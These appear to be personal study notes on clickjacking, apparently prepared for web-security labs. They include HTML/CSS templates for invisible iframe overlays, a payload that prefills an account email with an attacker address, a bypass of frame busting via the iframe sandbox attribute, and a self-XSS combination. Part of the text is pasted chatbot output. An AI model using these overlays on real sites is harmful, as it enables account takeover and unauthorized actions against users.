---
tags:
  - Clickjacking
  - clickjack
  - click
  - 2FA
---

![[Click Jacking-20240122114904079.webp]]
# What is click jacking ? 
- tricking the user  via  stealing his click in a hidden button over the correct button he is aiming to click . 
- so when use click  the correct button he by unknowing click into a hidden button that do another malicious activity . 
- the process occurs within hidden iframe 
## How to construct a basic clickjacking attack
- Click-jacking attacks use CSS to create and manipulate layers.
- The goal of clickjacking is to make the user interact with the invisible iframe, thinking they are interacting with the decoy content. The use of positioning, dimensions, opacity, and stacking order manipulation creates the illusion for the user.
```html
<style>
iframe{
	position: relative;
	width: 700px; /* Replace with the suggested width value */
	height: 1000px; /* Replace with the suggested height value */
	opacity: 0.1; /* Replace with the suggested opacity value */
	z-index: 2;
}
div{
	position: absolute;
	top: 500;
	left: 300;
	z-index:1;
}
</style>
<div>Click Me</div>
<iframe src="theTargetSite"></iframe>
```
Certainly! Here's the consolidated summary of the concepts, including CSS selectors, positioning, and the clickjacking script:

```markdown
# CSS Selectors and Positioning Summary

## CSS Selectors:

### 1. Element Selector (Type Selector):
```css
p {
  /* Styles applied to all <p> elements */
}
```

### 2. Class Selector:
```css
.className {
  /* Styles applied to all elements with class 'className' */
}
```

### 3. ID Selector:
```css
#elementId {
  /* Styles applied to the element with id 'elementId' */
}
```

### 4. @media Rule:
```css
@media screen and (max-width: 600px) {
  /* Styles applied when the screen width is 600 pixels or less */
  body {
    background-color: lightblue;
  }
}
```

## CSS Positioning:

### 1. Position Property:
```css
#element {
  position: relative; /* or position: absolute; */
  top: 10px;
  left: 20px;
}
```

### 2. Stacking Order (z-index):
```css
#element1 {
  z-index: 2;
}

#element2 {
  z-index: 1;
}
```

## Clickjacking Script:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clickjacking Example</title>
  <style>
    #target_website {
      position: relative;
      width: 128px;
      height: 128px;
      opacity: 0.00001;
      z-index: 2;
    }

    #decoy_website {
      position: absolute;
      width: 300px;
      height: 400px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <!-- Decoy web content here -->
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com"></iframe>
</body>
</html>
```

In the clickjacking script, an invisible iframe (`#target_website`) is overlaid on top of a decoy website (`#decoy_website`). The decoy content is meant to deceive the user, while their interactions are directed to the hidden iframe loading a potentially malicious target website. Adjustments to the CSS properties can affect the appearance and behavior of the clickjacking technique.

Note: Always consider ethical implications and legal constraints when experimenting with or discussing security-related concepts.

---
# Clickjacking with prefilled form input 
Here's an example of a clickjacking attack with prefilled form input:

**Scenario:**

Imagine you're logged in to your online banking website and checking your account balance. Meanwhile, you open another tab to click on a funny cat video link you saw on social media.

The cat video link actually leads to a malicious website controlled by an attacker. This website displays a funny video clip of a cat playing with a ball. Overlaid on the video is a translucent button that says "Click here for more cat videos!"

**The attack:**

- The malicious website embeds your online banking website in an invisible iframe positioned behind the "more cat videos" button.
- The attacker has cleverly modified your online banking website URL to prefill the "transfer recipient" field with their bank account number and the "transfer amount" field with a large sum of money.
- When you click the "more cat videos" button, you're actually clicking the invisible submit button on the iframe, triggering the prefilled transfer from your bank account to the attacker's.

## Clickjacking with Prefilled Form Input

### Vulnerability

Websites allowing prefilled form inputs and lacking clickjacking defenses.

### Attack Scenario

* Attacker crafts a malicious website with enticing elements (e.g., funny video).
* Attacker modifies vulnerable website URL to prefill forms with attacker's benefit (e.g., stealing data).
* Attacker embeds vulnerable website in an invisible iframe on their site.
* User clicks enticing element, triggering the invisible iframe form submission.

### Impact

* Stealing sensitive information (e.g., login credentials, bank details).
* Performing unauthorized actions (e.g., changing account settings, posting spam).
* Spreading malware (e.g., downloading malicious software onto user's device).

### Example

Cat video link that triggers unauthorized bank transfer.

### Prevention

* Be cautious with links, especially from untrusted sources.
* Watch for suspicious overlaps between elements on websites (e.g., buttons).
* Use security tools (e.g., browser extensions, ad blockers) to prevent clickjacking.

```html
<style> 
iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } 
div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } 
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

---
 # Frame Busting: Bypassing the Fence with Sandbox

## Frame Busting

* Websites use frame busting scripts to prevent being framed for clickjacking attacks.
* These scripts typically:
    - Check if the window is the main window.
    - Make frames visible.
    - Block clicks on invisible frames.

## Attacker's Workaround

* Attackers can use the HTML5 `iframe sandbox` attribute to limit iframe capabilities.
* By setting it to `allow-forms` or `allow-scripts` while excluding `allow-top-navigation`, they can:
    - Run forms and scripts within the iframe.
    - Keep the iframe "locked" and invisible to frame busting scripts.

## Why Frame Busting is Blinded

* Frame busters typically check if the website is outside the sandbox.
* The attacker's locked iframe is hidden within the sandbox, making it invisible to the script.
* The script thinks the website is in the main window and doesn't trigger protection.

## Key Takeaways

* Frame busting is not foolproof and can be bypassed.
* Sandbox can be misused to bypass frame busting.
* Stay vigilant and cautious when clicking links.
* Practice safe browsing habits.

## Additional Notes

* Consider researching other clickjacking prevention techniques.
* Stay informed about evolving security threats.
* Use browser extensions or plugins for enhanced protection.
---

## Combining clickjacking with a DOM XSS attack

- If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link. Example: _You found a_ _**self XSS**_ _in some private details of the account (details that_ _**only you can set and read**__). The page with the_ _**form**_ _to set these details is_ _**vulnerable**_ _to_ _**Clickjacking**_ _and you can_ _**prepopulate**_ _the_ _**form**_ _with the GET parameters._ __An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **form** with the **XSS payload** and **tricking** the **user** into **Submit** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.
- 